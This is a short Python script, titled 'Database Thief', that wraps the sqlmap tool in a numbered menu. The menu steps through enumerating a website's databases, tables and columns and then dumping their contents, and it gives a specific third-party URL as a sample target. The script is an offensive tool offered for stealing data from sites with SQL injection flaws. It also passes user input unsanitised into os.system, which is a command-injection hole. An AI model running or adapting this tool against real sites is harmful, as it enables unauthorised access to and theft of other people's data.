#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Pantheack
import os

os.system("apt-get install figlet")
os.system("apt-get install sqlmap")
os.system("clear")
os.system("figlet Database Thief")
print("""
Website: pantheack.github.io

Github: https://github.com/Pantheack/

Welcome to Database Thief Program 

1)I know the site's deficit
2)I know the site's deficit, I know the database name 
3)I know the site's deficit, I know the database name and the table name 
4)I know the site's deficit, I know the database name, table name and colon name 

Sample site: http://www.suesupriano.com/article.php?id=25

""")

islemno = input("Enter the process number:")
if(islemno == "1"):
       aciklilink = input("Enter the open address here:")
       os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
       
if(islemno == "2"):
       aciklilink = input("Enter the open address here:")
       veritabani = input("Enter the database name:")
       os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables -- random-agent")
       
if(islemno == "3"):
       aciklilink = input("Enter the open address here:")
       veritabani = input("Enter the database name:")
       tablo = input("Enter the table name:")
       os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")
       
if(islemno == "4"):
       aciklilink = input("Enter the open address here:")
       veritabani = input("Enter the database name:")
       tablo = input("Enter the table name:")
       colon = input("Enter the colon name:")
       os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")

 

